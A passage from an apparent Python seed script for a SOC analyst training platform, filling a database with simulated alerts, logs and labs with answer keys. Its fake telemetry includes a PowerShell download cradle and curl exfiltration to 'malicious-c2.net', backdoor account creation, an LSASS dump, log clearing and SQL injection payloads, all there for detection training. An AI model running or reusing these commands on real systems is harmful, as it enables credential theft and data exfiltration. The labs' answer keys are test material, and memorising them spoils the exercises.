            timestamp=now - timedelta(hours=28),
            severity="LOW",
            source_ip="198.51.100.80",
            destination_ip="192.168.1.10",
            source_host="ATTACKER-SCANNER",
            destination_host="DMZ-WEB01",
            username=None,
            event_type="WEB_FUZZING",
            description="150 HTTP 404 responses in 60 seconds (probing for /admin, /wp-login, /.git, /backup.zip).",
            detection_rule="WEB_DIRECTORY_BRUTEFORCE",
            mitre_technique="T1595.002",
            status="Resolved",
            assigned_analyst="Marcus Triage",
            notes="Rate limit rule blocked IP for 1 hour.",
            incident_id=None
        ),
        Alert(
            title="NBT-NS / LLMNR Poisoning Query Anomaly",
            timestamp=now - timedelta(hours=30),
            severity="MEDIUM",
            source_ip="192.168.1.199",
            destination_ip="224.0.0.252",
            source_host="UNKNOWN-ROGUE-DEVICE",
            destination_host="BROADCAST",
            username=None,
            event_type="NAME_RESOLUTION_POISONING",
            description="Multicast LLMNR query received for non-existent server WPAD from rogue device.",
            detection_rule="LLMNR_SPOOFING_DETECTION",
            mitre_technique="T1557.001",
            status="Investigating",
            assigned_analyst="Sarah Blue",
            notes="Investigating rogue device MAC address on switch port 14.",
            incident_id=None
        ),
        Alert(
            title="Ransomware Extension Anomaly (.locked files detected)",
            timestamp=now - timedelta(hours=32),
            severity="CRITICAL",
            source_ip="192.168.1.77",
            destination_ip="192.168.1.20",
            source_host="DESKTOP-TEST-VM",
            destination_host="DC-PRIMARY",
            username="lab.test",
            event_type="RANSOMWARE_INDICATOR",
            description="File share canary file modified with extension .locked in isolated malware lab VM.",
            detection_rule="RANSOMWARE_CANARY_TRIGGER",
            mitre_technique="T1486",
            status="Resolved",
            assigned_analyst="Alex Analyst",
            notes="Confirmed authorized student test in isolated sandbox VM.",
            incident_id=None
        ),
        Alert(
            title="Suspicious Inbound ICMP Tunneling Traffic",
            timestamp=now - timedelta(hours=34),
            severity="LOW",
            source_ip="198.51.100.150",
            destination_ip="192.168.1.1",
            source_host="EXTERNAL-TUNNEL",
            destination_host="EDGE-ROUTER",
            username=None,
            event_type="ICMP_ANOMALY",
            description="Abnormally large ICMP echo request packets (payload size > 1400 bytes) observed.",
            detection_rule="ICMP_TUNNELING_DETECTION",
            mitre_technique="T1095",
            status="Resolved",
            assigned_analyst="Unassigned",
            notes="Perimeter firewall rule dropped ICMP payload.",
            incident_id=None
        ),
        Alert(
            title="Windows Defender Real-Time Protection Disabled",
            timestamp=now - timedelta(hours=36),
            severity="HIGH",
            source_ip="192.168.1.140",
            destination_ip="192.168.1.140",
            source_host="WORKSTATION-CEO",
            destination_host="WORKSTATION-CEO",
            username="alex.executive",
            event_type="DEFENSE_EVASION",
            description="Windows Defender Event 5001: Real-time protection was disabled via PowerShell Set-MpPreference.",
            detection_rule="DEFENSE_EVASION_RULE",
            mitre_technique="T1562.001",
            status="Escalated",
            assigned_analyst="Alex Analyst",
            notes="Linked to Incident #2 post-exploitation activity.",
            incident_id=2
        ),
    ]
    db.add_all(alerts_data)
    db.commit()

    # 8. Seed 100+ Security Events
    events_data = []
    base_time = now - timedelta(hours=24)

    # 20 failed login events for brute force cluster
    for i in range(20):
        t = base_time + timedelta(minutes=i * 2)
        events_data.append(Event(
            timestamp=t,
            source="Windows",
            event_type="FAILED_LOGIN",
            severity="HIGH",
            source_ip="198.51.100.23",
            destination_ip="192.168.1.50",
            source_host="EXTERNAL-ATTACKER",
            destination_host="SRV-RDP-GATEWAY",
            username="administrator",
            process="C:\\Windows\\System32\\svchost.exe",
            message=f"Logon failure for user administrator. Reason: Unknown user name or bad password. (Attempt {i+1} of 20). Status: 0xC000006D.",
            raw_log=f"<Event><System><EventID>4625</EventID><TimeCreated SystemTime='{t.isoformat()}'/></System><EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>198.51.100.23</Data><Data Name='WorkstationName'>ATTACK-BOX</Data></EventData></Event>",
            mitre_technique="T1110.001",
            metadata_json=json.dumps({"substatus": "0xC000006A", "logon_type": 10})
        ))

    # 15 Firewall port scan events
    scanned_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389]
    for idx, port in enumerate(scanned_ports):
        t = base_time + timedelta(hours=2, seconds=idx * 2)
        events_data.append(Event(
            timestamp=t,
            source="Firewall",
            event_type="PORT_SCAN",
            severity="MEDIUM",
            source_ip="203.0.113.88",
            destination_ip="192.168.1.10",
            source_host="EXTERNAL-SCANNER",
            destination_host="DMZ-WEB01",
            username=None,
            process=None,
            message=f"Firewall Drop: Inbound connection attempt to TCP port {port} rejected. Flags: [SYN].",
            raw_log=f"Sep 12 03:00:{idx:02d} fw-01 kernel: [PORT_SCAN_REJECT] SRC=203.0.113.88 DST=192.168.1.10 PROTO=TCP SPT=49152 DPT={port} FLAGS=SYN",
            mitre_technique="T1046",
            metadata_json=json.dumps({"protocol": "TCP", "dest_port": port, "action": "DROP"})
        ))

    # 15 PowerShell and endpoint events
    ps_commands = [
        "powershell.exe -ExecutionPolicy Bypass -NoLogo -WindowStyle Hidden -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps1')",
        "powershell.exe -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBuAGUAdAAvAGkAbgB2AG8AawBlAC4AcABzADEAJwApAA==",
        "svchost_updater.exe -connect 45.33.32.156:443",
        "cmd.exe /c whoami /all > C:\\Windows\\Temp\\who.txt",
        "net.exe user /add backdoor P@ssw0rd123!",
        "net.exe localgroup administrators backdoor /add",
        "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\svchost_updater.exe /f",
        "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
        "powershell.exe Get-Process lsass",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full",
        "powershell.exe Compress-Archive -Path C:\\Users\\alex.executive\\Documents -DestinationPath C:\\Windows\\Temp\\exfil.zip",
        "curl.exe -F 'data=@C:\\Windows\\Temp\\exfil.zip' http://malicious-c2.net/upload",
        "del.exe /f /q C:\\Windows\\Temp\\who.txt",
        "del.exe /f /q C:\\Windows\\Temp\\lsass.dmp",
        "powershell.exe Clear-EventLog -LogName Security"
    ]
    for idx, cmd in enumerate(ps_commands):
        t = base_time + timedelta(hours=4, minutes=idx * 4)
        events_data.append(Event(
            timestamp=t,
            source="Windows",
            event_type="SUSPICIOUS_PROCESS",
            severity="HIGH" if idx < 7 else "CRITICAL",
            source_ip="192.168.1.140",
            destination_ip="192.168.1.140",
            source_host="WORKSTATION-CEO",
            destination_host="WORKSTATION-CEO",
            username="alex.executive",
            process=cmd.split()[0],
            message=f"Process Creation Event ID 4688: Executed command: {cmd}",
            raw_log=f"<Event><System><EventID>4688</EventID><TimeCreated SystemTime='{t.isoformat()}'/></System><EventData><Data Name='NewProcessName'>{cmd.split()[0]}</Data><Data Name='CommandLine'>{cmd}</Data><Data Name='ParentProcessName'>explorer.exe</Data></EventData></Event>",
            mitre_technique="T1059.001",
            metadata_json=json.dumps({"command_line": cmd, "pid": 4120 + idx})
        ))

    # 15 Web server SQL injection events
    sqli_payloads = [
        "/products.php?id=1",
        "/products.php?id=1'",
        "/products.php?id=1%27%20OR%201=1--",
        "/products.php?id=1%27%20UNION%20SELECT%20null,null,null--",
        "/products.php?id=1%27%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables--",
        "/products.php?id=1%27%20UNION%20SELECT%201,column_name,3%20FROM%20information_schema.columns%20WHERE%20table_name='users'--",
        "/products.php?id=1%27%20UNION%20SELECT%20id,username,password_hash%20FROM%20users--",
        "/products.php?id=1%27;%20WAITFOR%20DELAY%20'0:0:5'--",
        "/products.php?id=1%27%20AND%20SLEEP(5)--",
        "/products.php?id=admin%27--",
        "/login.php HTTP POST user=admin' or '1'='1&pass=123",
        "/login.php HTTP POST user=admin'--&pass=x",
        "/api/v1/search?query=test%27%20UNION%20SELECT%20@@version--",
        "/api/v1/user?id=1%20OR%20id=2",
        "/admin.php?token=%27%20OR%20%271%27=%271"
    ]
    for idx, sqli in enumerate(sqli_payloads):
        t = base_time + timedelta(hours=6, minutes=idx * 3)
        events_data.append(Event(
            timestamp=t,
            source="Web Server",
            event_type="SQL_INJECTION",
            severity="HIGH",
            source_ip="198.51.100.99",
            destination_ip="192.168.1.10",
            source_host="ATTACKER-IP",
            destination_host="DMZ-WEB01",
            username="www-data",
            process="nginx/1.24.0",
            message=f"HTTP 500 GET {sqli} - SQL Error syntax warning returned to client.",
            raw_log=f"198.51.100.99 - - [{t.strftime('%d/%b/%Y:%H:%M:%S +0000')}] \"GET {sqli} HTTP/1.1\" 500 2412 \"-\" \"sqlmap/1.7#dev\"",
            mitre_technique="T1190",
            metadata_json=json.dumps({"status_code": 500, "user_agent": "sqlmap/1.7#dev", "uri": sqli})
        ))

    # 15 Normal / Benign Operational Events
    benign_users = ["sarah.finance", "john.hr", "david.marketing", "lisa.dev", "emma.ops"]
    for idx, user in enumerate(benign_users * 3):
        t = base_time + timedelta(hours=8, minutes=idx * 15)
        events_data.append(Event(
            timestamp=t,
            source="Windows",
            event_type="SUCCESSFUL_LOGIN",
            severity="INFORMATIONAL",
            source_ip=f"192.168.1.{100 + idx}",
            destination_ip="192.168.1.20",
            source_host=f"WORKSTATION-{user.split('.')[0].upper()}",
            destination_host="DC-PRIMARY",
            username=user,
            process="lsass.exe",
            message=f"Logon success for user {user}. Logon Type: 2 (Interactive). Kerberos authentication verified.",
            raw_log=f"<Event><System><EventID>4624</EventID><TimeCreated SystemTime='{t.isoformat()}'/></System><EventData><Data Name='TargetUserName'>{user}</Data><Data Name='IpAddress'>192.168.1.{100+idx}</Data></EventData></Event>",
            mitre_technique=None,
            metadata_json=json.dumps({"logon_type": 2, "auth_package": "Kerberos"})
        ))

    # 15 DNS Query Events
    domains_queried = [
        "mail.internal.corp", "intranet.corp.local", "gitlab.corp.local", "api.github.com",
        "update.microsoft.com", "slack.com", "zoom.us", "docs.google.com",
        "login.microsoftonline.com", "aws.amazon.com", "cloudflare.com", "registry.npmjs.org",
        "pypi.org", "cdn.jsdelivr.net", "fonts.googleapis.com"
    ]
    for idx, d in enumerate(domains_queried):
        t = base_time + timedelta(hours=12, minutes=idx * 10)
        events_data.append(Event(
            timestamp=t,
            source="DNS",
            event_type="DNS_QUERY",
            severity="INFORMATIONAL",
            source_ip="192.168.1.88",
            destination_ip="192.168.1.2",
            source_host="DESKTOP-HR01",
            destination_host="DNS-CORP",
            username="john.hr",
            process="svchost.exe",
            message=f"DNS Standard Query for {d} IN A resolved to standard IP.",
            raw_log=f"client 192.168.1.88#51240 ({d}): query: {d} IN A + (192.168.1.2)",
            mitre_technique=None,
            metadata_json=json.dumps({"query_type": "A", "domain": d})
        ))

    # 10 Phishing email and gateway events
    for idx in range(10):
        t = base_time + timedelta(hours=15, minutes=idx * 8)
        events_data.append(Event(
            timestamp=t,
            source="Authentication",
            event_type="PHISHING_DETECTED",
            severity="MEDIUM",
            source_ip="185.220.101.5",
            destination_ip="192.168.1.25",
            source_host="MAIL-GATEWAY",
            destination_host="MAIL-CORP",
            username="alex.executive",
            process="postfix/smtpd",
            message=f"Email Gateway: Inbound message from billing@bankofamer1ca-notice.com SPF=fail (IP 185.220.101.5 not authorized). Attachment: invoice_{idx+1}.pdf.exe",
            raw_log=f"postfix[882{idx}]: NOQUEUE: milter-reject: RCPT from unknown[185.220.101.5]: 550 5.7.1 SPF policy fail; from=<billing@bankofamer1ca-notice.com> to=<alex.executive@corp.local>",
            mitre_technique="T1566.001",
            metadata_json=json.dumps({"spf": "fail", "dkim": "none", "sender": "billing@bankofamer1ca-notice.com"})
        ))

    db.add_all(events_data)
    db.commit()

    # 9. Seed the 7 Complete Learning Labs
    labs_data = [
        Lab(
            lab_number=1,
            title="Lab 01 — Brute Force Authentication Detection",
            category="Identity & Access Management",
            difficulty="Beginner",
            scenario="""A security alert has flagged unusual logon failures against an internal remote desktop server (SRV-RDP-GATEWAY.corp.local).
As an L1 SOC analyst, your task is to investigate the Windows Security Event Logs (Event ID 4625), count the number of failed attempts, identify the attacker's source IP address, and determine whether the attacker successfully breached the account (Event ID 4624).""",
            learning_objectives_json=json.dumps([
                "Understand Windows Security Event ID 4625 (Logon Failure) and 4624 (Logon Success)",
                "Identify external attacker IP addresses in authentication telemetry",
                "Recognize password guessing patterns and automated dictionary bursts",
                "Determine compromise status and recommend appropriate account lockout remediation"
            ]),
            evidence_json=json.dumps([
                {"time": "09:00:12", "source": "Windows Security", "event_id": 4625, "user": "administrator", "src_ip": "198.51.100.23", "status": "0xC000006D", "substatus": "0xC000006A (Bad Password)"},
                {"time": "09:00:15", "source": "Windows Security", "event_id": 4625, "user": "administrator", "src_ip": "198.51.100.23", "status": "0xC000006D", "substatus": "0xC000006A (Bad Password)"},
                {"time": "09:00:18", "source": "Windows Security", "event_id": 4625, "user": "administrator", "src_ip": "198.51.100.23", "status": "0xC000006D", "substatus": "0xC000006A (Bad Password)"},
                {"time": "09:00:22", "source": "Windows Security", "event_id": 4625, "user": "administrator", "src_ip": "198.51.100.23", "status": "0xC000006D", "substatus": "0xC000006A (Bad Password)"},
                {"time": "09:00:25", "source": "Windows Security", "event_id": 4625, "user": "administrator", "src_ip": "198.51.100.23", "status": "0xC000006D", "substatus": "0xC000006A (Bad Password)"},
                {"time": "09:00:30", "source": "Active Directory", "event_id": 4740, "user": "administrator", "src_ip": "198.51.100.23", "status": "Account Locked Out"}
            ]),
            questions_json=json.dumps([
                {
                    "id": "q1",
                    "question": "What is the source IP address of the attacker attempting the brute-force attack?",
                    "type": "text",
                    "accepted_answers": ["198.51.100.23"],
                    "points": 25,
                    "explanation": "Windows Event 4625 telemetry lists IpAddress=198.51.100.23 as the external origin of the failed logon requests."
                },
                {
                    "id": "q2",
                    "question": "What is the target username being brute-forced?",
                    "type": "text",
                    "accepted_answers": ["administrator", "admin"],
                    "points": 25,
                    "explanation": "The TargetUserName field across all failed authentication events is 'administrator'."
                },
                {
                    "id": "q3",
                    "question": "Was the administrator account successfully compromised by the attacker? (yes/no)",
                    "type": "choice",
                    "options": ["yes", "no"],
                    "accepted_answers": ["no", "false"],
                    "points": 25,
                    "explanation": "No Event ID 4624 (Logon Success) was recorded. Instead, Active Directory Event 4740 confirmed the account was locked out before breach."
                },
                {
                    "id": "q4",
                    "question": "Which MITRE ATT&CK technique corresponds to password guessing?",
                    "type": "choice",
                    "options": ["T1110.001", "T1059.001", "T1046", "T1190"],
                    "accepted_answers": ["T1110.001", "T1110"],
                    "points": 25,
                    "explanation": "T1110.001 represents Brute Force: Password Guessing under the Credential Access tactic."
                }
            ]),
            hints_json=json.dumps([
                "Hint 1: Review the IpAddress field in the Windows Security Event 4625 log table.",
                "Hint 2: Check whether any Event ID 4624 (Logon Success) exists after the failures or if Event 4740 locked the account.",
                "Hint 3: Refer to the MITRE ATT&CK section for credential access techniques."
            ]),
            explanations_json=json.dumps({
                "summary": "Brute force attacks generate bursts of 4625 events. Always verify if an Event 4624 occurred afterwards from the same IP to rule out compromise."
            }),
            skills_json=json.dumps(["Windows Event Logs", "Authentication Triage", "SIEM Querying", "MITRE ATT&CK"])
        ),
        Lab(
            lab_number=2,
            title="Lab 02 — Network Port Scan & Reconnaissance Detection",
            category="Network Security",
            difficulty="Beginner",
            scenario="""Perimeter firewall logs have detected a series of connection drops directed towards DMZ-WEB01 (192.168.1.10).
The network team suspects an external attacker is mapping open services prior to launching an exploit. Investigate the connection attempts and classify the scan.""",
            learning_objectives_json=json.dumps([
                "Understand TCP SYN scanning techniques and firewall drop telemetry",
                "Analyze source and destination IP addresses and ports",
                "Calculate total distinct ports probed during reconnaissance",
                "Differentiate between vertical and horizontal port scans"
            ]),
            evidence_json=json.dumps([
                {"time": "10:14:01", "proto": "TCP", "src": "203.0.113.88", "dst": "192.168.1.10", "dport": 21, "flags": "SYN", "action": "DROP"},
                {"time": "10:14:02", "proto": "TCP", "src": "203.0.113.88", "dst": "192.168.1.10", "dport": 22, "flags": "SYN", "action": "DROP"},
                {"time": "10:14:02", "proto": "TCP", "src": "203.0.113.88", "dst": "192.168.1.10", "dport": 80, "flags": "SYN", "action": "DROP"},
                {"time": "10:14:03", "proto": "TCP", "src": "203.0.113.88", "dst": "192.168.1.10", "dport": 443, "flags": "SYN", "action": "DROP"},
                {"time": "10:14:03", "proto": "TCP", "src": "203.0.113.88", "dst": "192.168.1.10", "dport": 3389, "flags": "SYN", "action": "DROP"}
            ]),
            questions_json=json.dumps([
                {
                    "id": "q1",
                    "question": "What is the external attacker IP conducting the port scan?",
                    "type": "text",
                    "accepted_answers": ["203.0.113.88"],
                    "points": 25,
                    "explanation": "The firewall connection logs show all SYN packets originating from source IP 203.0.113.88."
                },
                {
                    "id": "q2",
                    "question": "What is the internal destination target IP address?",
                    "type": "text",
                    "accepted_answers": ["192.168.1.10"],
                    "points": 25,
                    "explanation": "Target host DMZ-WEB01 has IP address 192.168.1.10."
                },
                {
                    "id": "q3",
                    "question": "How many distinct ports were probed by the attacker in the evidence logs?",
                    "type": "text",
                    "accepted_answers": ["5", "five"],
                    "points": 25,
                    "explanation": "Ports probed: 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), 3389 (RDP) -> total 5 ports."
                },
                {
                    "id": "q4",
                    "question": "What TCP flag was set on all probe packets?",
                    "type": "choice",
                    "options": ["SYN", "ACK", "FIN", "RST"],
                    "accepted_answers": ["SYN"],
                    "points": 25,
                    "explanation": "The attacker performed a classic TCP SYN 'stealth' half-open port scan."
                }
            ]),
            hints_json=json.dumps([
                "Hint 1: Look at the SRC column in the firewall drop logs.",
                "Hint 2: Count the unique values in the dport column.",
                "Hint 3: Look at the flags column on the incoming packets."
            ]),
            explanations_json=json.dumps({
                "summary": "Port scans probe multiple ports to map running daemons. Probing multiple ports on a single host is known as a vertical port scan."
            }),
            skills_json=json.dumps(["Network Analysis", "Firewall Telemetry", "TCP/IP Protocol", "Reconnaissance Detection"])
        ),
        Lab(
            lab_number=3,
            title="Lab 03 — Suspicious PowerShell Command-Line Investigation",
            category="Endpoint Detection",
            difficulty="Intermediate",
            scenario="""EDR telemetry on executive laptop WORKSTATION-CEO triggered an alert for anomalous PowerShell execution.
The command includes execution flags and an encoded base64 payload. Analyze the process creation event, safely inspect the encoded argument, and identify the staging URL.""",
            learning_objectives_json=json.dumps([
                "Analyze Windows Event ID 4688 and Sysmon process creation commands",
                "Understand PowerShell evasion flags (-EncodedCommand, -WindowStyle Hidden, -ExecutionPolicy Bypass)",
                "Safely inspect encoded base64 payloads without executing them",
                "Extract staging C2 download URLs and malicious artifacts"
            ]),
            evidence_json=json.dumps([
                {"time": "11:20:05", "process": "powershell.exe", "user": "alex.executive", "host": "WORKSTATION-CEO", "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBuAGUAdAAvAGkAbgB2AG8AawBlAC4AcABzADEAJwApAA=="},
                {"note": "Educational Decoded Representation: IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps1')"}
            ]),
            questions_json=json.dumps([
                {
                    "id": "q1",
                    "question": "What execution policy bypass flag was used in the PowerShell command?",
                    "type": "choice",
                    "options": ["-Exec Bypass", "-Force", "-Admin", "-Debug"],
                    "accepted_answers": ["-Exec Bypass", "Bypass", "-ExecutionPolicy Bypass"],
                    "points": 25,
                    "explanation": "The parameter '-Exec Bypass' was specified to circumvent PowerShell script execution restrictions."
                },
                {
                    "id": "q2",
                    "question": "What is the remote staging URL that the PowerShell cradle attempts to download?",
                    "type": "text",
                    "accepted_answers": ["http://malicious-c2.net/invoke.ps1", "malicious-c2.net/invoke.ps1"],
                    "points": 25,
                    "explanation": "The base64 payload decodes to Net.WebClient.DownloadString('http://malicious-c2.net/invoke.ps1')."
                },
                {
                    "id": "q3",
                    "question": "What is the domain name of the attacker's staging server?",
                    "type": "text",
                    "accepted_answers": ["malicious-c2.net"],
                    "points": 25,
                    "explanation": "The domain hosting the secondary payload is 'malicious-c2.net'."
                },
                {
                    "id": "q4",
                    "question": "What is the MITRE ATT&CK technique ID for PowerShell command-line execution?",
                    "type": "choice",
                    "options": ["T1059.001", "T1046", "T1110", "T1566"],
                    "accepted_answers": ["T1059.001"],
                    "points": 25,
                    "explanation": "T1059.001 specifically catalogs Command and Scripting Interpreter: PowerShell."
                }
            ]),
            hints_json=json.dumps([
                "Hint 1: Review the command line arguments preceding the -Enc parameter.",
                "Hint 2: Look at the educational decoded string in the evidence tab to find the URL.",
                "Hint 3: Extract the hostname portion of the URL http://malicious-c2.net/invoke.ps1."
            ]),
            explanations_json=json.dumps({
                "summary": "Attackers frequently use Base64 encoding in PowerShell to hide download cradles from simple string-based AV scanners."
            }),
            skills_json=json.dumps(["Windows Event 4688", "PowerShell Analysis", "De-obfuscation", "Threat Hunting"])
        ),
        Lab(
            lab_number=4,
            title="Lab 04 — Spearphishing Email Header & Attachment Analysis",
            category="Email Security",
            difficulty="Beginner",
            scenario="""An executive reported receiving an urgent financial notification email claiming an unpaid corporate invoice.
The email includes an attachment named 'urgent_invoice_2026.pdf.exe'. Analyze the raw email headers, SPF status, and attachment to identify indicators of phishing.""",
            learning_objectives_json=json.dumps([
                "Inspect RFC 822 email headers (From, Return-Path, Received, Authentication-Results)",
                "Verify Sender Policy Framework (SPF) and DKIM authentication records",
                "Identify deceptive typosquatted domains and display name spoofing",
                "Spot double-extension executable camouflage techniques (.pdf.exe)"
            ]),
            evidence_json=json.dumps([
                {"header": "From", "value": "\"ExampleBank Billing\" <billing@bankofamer1ca-notice.com>"},
                {"header": "Return-Path", "value": "<attacker-relay@185.220.101.5>"},
                {"header": "Received-From", "value": "185.220.101.5 (mail-sender.bulletproof-host.xyz)"},
                {"header": "Subject", "value": "URGENT: Outstanding Overdue Invoice - Wire Required"},
                {"header": "Authentication-Results", "value": "spf=fail (sender IP 185.220.101.5 not permitted for bankofamer1ca-notice.com); dkim=none"},
                {"header": "Attachment-Name", "value": "urgent_invoice_2026.pdf.exe"},
                {"header": "Attachment-SHA256", "value": "7d4a6f23b89e1a4c9d5e6f7a8b9c0d1e3f2a1b5c6d7e8f9a0b1c2d3e4f5a6b7c"}
            ]),
            questions_json=json.dumps([
                {
                    "id": "q1",
                    "question": "What is the spoofed sender domain used by the phisher?",
                    "type": "text",
                    "accepted_answers": ["bankofamer1ca-notice.com"],
                    "points": 25,
                    "explanation": "The From address domain is typosquatted with the number '1' instead of letter 'i': bankofamer1ca-notice.com."
                },
                {
                    "id": "q2",
                    "question": "Did the incoming email pass or fail the SPF authentication check?",
                    "type": "choice",
                    "options": ["fail", "pass", "neutral"],
                    "accepted_answers": ["fail"],
                    "points": 25,
                    "explanation": "Authentication-Results explicitly states 'spf=fail'."
                },
                {
                    "id": "q3",
                    "question": "What is the true file extension of the attachment 'urgent_invoice_2026.pdf.exe'?",
                    "type": "text",
                    "accepted_answers": [".exe", "exe"],
                    "points": 25,
                    "explanation": "The file uses double-extension deception; Windows executes the final extension (.exe), meaning it is an executable binary, not a PDF."
                },
                {
                    "id": "q4",
                    "question": "What is the originating IP address of the relay server that sent the email?",
                    "type": "text",
                    "accepted_answers": ["185.220.101.5"],
                    "points": 25,
                    "explanation": "The Received-From header indicates origin IP 185.220.101.5."
                }
            ]),
            hints_json=json.dumps([
                "Hint 1: Look closely at the domain name in the From header. Check the spelling.",
                "Hint 2: Read the Authentication-Results header line for the SPF status.",
                "Hint 3: In Windows, the operating system executes the file based on the characters after the final dot."
            ]),
            explanations_json=json.dumps({
                "summary": "Phishing emails use deceptive sender addresses and double extensions to trick users into executing binaries disguised as invoices."
            }),
            skills_json=json.dumps(["Email Header Analysis", "SPF/DKIM Triage", "Social Engineering Recognition", "IOC Extraction"])
        ),
        Lab(
            lab_number=5,
            title="Lab 05 — Malware Indicator of Compromise (IOC) Extraction",
            category="Threat Intelligence",
            difficulty="Intermediate",
            scenario="""A suspicious file was quarantined from an endpoint and submitted for triage.
As the SOC analyst, extract all relevant Indicators of Compromise (IOCs) including cryptographic hashes, C2 network connections, and persistence registry keys to create an actionable threat intelligence report.""",
            learning_objectives_json=json.dumps([
                "Extract MD5 and SHA-256 cryptographic file hashes",
                "Identify Command and Control (C2) IP addresses and domain infrastructure",
                "Document host-based persistence mechanisms in Windows registry",
                "Structure IOCs with appropriate confidence ratings for defensive firewalls"
            ]),
            evidence_json=json.dumps([
                {"field": "Malware Sample File", "value": "svchost_updater.exe"},
                {"field": "SHA-256 Hash", "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
                {"field": "C2 Destination IP", "value": "45.33.32.156"},
                {"field": "C2 Destination Domain", "value": "malicious-c2.net"},
                {"field": "Beaconing Port", "value": "443 (HTTPS)"},
                {"field": "Registry Persistence Key", "value": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"}
            ]),
            questions_json=json.dumps([
                {
                    "id": "q1",
                    "question": "What is the SHA-256 hash of the malware sample?",
                    "type": "text",
                    "accepted_answers": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "e3b0c44298fc1c149afbf4c8996fb924"],
                    "points": 25,
                    "explanation": "The SHA-256 uniquely identifies the exact binary sample for EDR and AV blocking."
                },
                {
                    "id": "q2",
                    "question": "What is the C2 destination IP address that must be blocked in the perimeter firewall?",
                    "type": "text",
                    "accepted_answers": ["45.33.32.156"],
                    "points": 25,
                    "explanation": "Outbound beacons were established to IP 45.33.32.156."
                },
                {
                    "id": "q3",
                    "question": "What is the deceptive filename chosen by the malware to blend into legitimate processes?",
                    "type": "text",
                    "accepted_answers": ["svchost_updater.exe"],
                    "points": 25,
                    "explanation": "The malware masqueraded as 'svchost_updater.exe' to mimic Windows Service Host (svchost.exe)."
                },
                {
                    "id": "q4",
                    "question": "What Windows registry hive was modified to establish persistence?",
                    "type": "choice",
                    "options": ["HKLM", "HKCU", "HKCR", "HKCC"],
                    "accepted_answers": ["HKLM"],
                    "points": 25,
                    "explanation": "The Run key was established under HKLM (HKEY_LOCAL_MACHINE)."
                }
            ]),
            hints_json=json.dumps([
                "Hint 1: Look at the SHA-256 hash string in the evidence panel.",
                "Hint 2: Find the destination IP address used for C2 beaconing.",
                "Hint 3: Look at the prefix of the registry persistence path."
            ]),
            explanations_json=json.dumps({
                "summary": "Effective SOC L1 analysts extract both host-based (hashes, registry keys) and network-based (IPs, domains) IOCs to achieve defense-in-depth."
            }),
            skills_json=json.dumps(["IOC Extraction", "Hash Analysis", "Threat Intelligence", "EDR Triage"])
        ),
        Lab(
            lab_number=6,
            title="Lab 06 — Web Server SQL Injection (SQLi) Log Analysis",
            category="Web Application Security",
            difficulty="Intermediate",
            scenario="""A public-facing e-commerce web application DMZ-WEB01 (192.168.1.10) experienced an influx of HTTP 500 internal server errors.
Review the Nginx access logs to identify the attacker's source IP, the targeted URI parameter, and the SQL injection technique employed.""",
            learning_objectives_json=json.dumps([
                "Read and parse standard web server access logs (Common Log Format / Combined)",
                "Identify SQL injection payloads such as UNION SELECT, OR 1=1, and sleep commands",
                "Differentiate between legitimate user queries and automated database extraction tools",
                "Formulate WAF mitigation rules and developer remediation recommendations"
            ]),
            evidence_json=json.dumps([
                {"time": "14:10:02", "src_ip": "198.51.100.99", "method": "GET", "uri": "/products.php?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users--", "status": 500, "user_agent": "sqlmap/1.7#dev"},
                {"time": "14:10:05", "src_ip": "198.51.100.99", "method": "GET", "uri": "/products.php?id=1%27%20OR%201=1--", "status": 200, "user_agent": "sqlmap/1.7#dev"},
                {"time": "14:10:10", "src_ip": "198.51.100.99", "method": "GET", "uri": "/products.php?id=1;%20WAITFOR%20DELAY%20'0:0:5'--", "status": 200, "user_agent": "sqlmap/1.7#dev"}
            ]),
            questions_json=json.dumps([
                {
                    "id": "q1",
                    "question": "What is the source IP of the attacker conducting the SQL injection attack?",
                    "type": "text",
                    "accepted_answers": ["198.51.100.99"],
                    "points": 25,
                    "explanation": "The web server access log lists source IP 198.51.100.99 for all malicious requests."
                },
                {
                    "id": "q2",
                    "question": "What automated penetration testing tool user-agent was identified in the HTTP header?",
                    "type": "text",
                    "accepted_answers": ["sqlmap", "sqlmap/1.7#dev", "sqlmap/1.7"],
                    "points": 25,
                    "explanation": "The User-Agent string explicitly identified 'sqlmap/1.7#dev'."
                },
                {
                    "id": "q3",
                    "question": "What sensitive database table was targeted in the UNION SELECT query?",
                    "type": "text",
                    "accepted_answers": ["users"],
                    "points": 25,
                    "explanation": "The attacker attempted to extract username and password_hash from the 'users' table."
                },
                {
                    "id": "q4",
                    "question": "What is the recommended permanent code fix to prevent SQL injection?",
                    "type": "choice",
                    "options": ["Parameterized Queries (Prepared Statements)", "Disabling HTTPS", "Hiding the database error messages only", "Changing the web server port"],
                    "accepted_answers": ["Parameterized Queries (Prepared Statements)", "Parameterized Queries", "Prepared Statements"],
                    "points": 25,
